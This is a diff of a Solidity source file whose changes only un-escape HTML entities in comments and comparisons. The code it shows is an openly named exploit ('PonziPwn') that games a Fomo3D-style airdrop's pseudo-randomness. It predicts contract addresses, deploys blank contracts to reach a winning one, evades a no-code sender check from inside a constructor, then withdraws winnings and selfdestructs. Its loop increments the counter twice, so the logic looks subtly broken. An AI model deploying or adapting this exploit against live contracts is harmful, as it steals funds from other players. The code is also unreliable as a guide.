@@ -8,7 +8,7 @@ interface GameOfSwordsInterface {
 
 /* 
  * Contract addresses are deterministic. 
- * We find out how many deployments it&#39;ll take to get a winning contract a
+ * We find out how many deployments it'll take to get a winning contract a
  * then deploy blank contracts until we get to the second last number of deployments to generate a successful address.
 */
 contract BlankContract {
@@ -22,7 +22,7 @@ contract AirDropWinner {
     /*
      * 0.1 ether corresponds the amount to send to Fomo3D for a chance at winning the airDrop
      * This is sent within the constructor to bypass a modifier that checks for blank code from the message sender
-     * As during construction a contract&#39;s code is blank.
+     * As during construction a contract's code is blank.
      * We then withdraw all earnings from fomo3d and selfdestruct to returns all funds to the main exploit contract.
      */
     constructor() public {
@@ -41,7 +41,7 @@ contract PonziPwn {
     uint256 private blankContractGasLimit = 20000;
     uint256 private pwnContractGasLimit = 250000;
        
-    //gasPrice you&#39;ll use during the exploit
+    //gasPrice you'll use during the exploit
     uint256 private gasPrice = 10;
     uint256 private gasPriceInWei = gasPrice*1e9;
     
@@ -81,9 +81,9 @@ contract PonziPwn {
                    (block.number)
             )));
 
-            //Tally number of contract deployments that&#39;ll result in a win. 
+            //Tally number of contract deployments that'll result in a win. 
             //We tally the cost of deploying blank contracts.
-            if((_seed - ((_seed / 1000) * 1000)) &gt;= _tracker) {
+            if((_seed - ((_seed / 1000) * 1000)) >= _tracker) {
                     _newSender = address(keccak256(abi.encodePacked(0xd6, 0x94, _newSender, 0x01)));
                     _nContracts++;
                     _pwnCost+= blankContractCost;
@@ -101,7 +101,7 @@ contract PonziPwn {
 	 * deploy blank contracts until the final index at which point we first send ETH to the pregenerated address then deploy
          * an airdrop winning contract which will have that address;
         */
-        for(uint256 _i; _i &lt; _nContracts; _i++) {
+        for(uint256 _i; _i < _nContracts; _i++) {
             if(_i++ == _nContracts) {
                address(_newSender).call.value(0.1 ether)();
                new AirDropWinner();
@@ -118,7 +118,7 @@ contract PonziPwn {
         (_pwnCost, _nContracts,_newSender) = checkPwnData();
         
 	//check that the cost of executing the attack will make it worth it
-        if(_pwnCost + 0.1 ether &lt; maxAmount) {
+        if(_pwnCost + 0.1 ether < maxAmount) {
            deployContracts(_nContracts,_newSender);
         }
     }
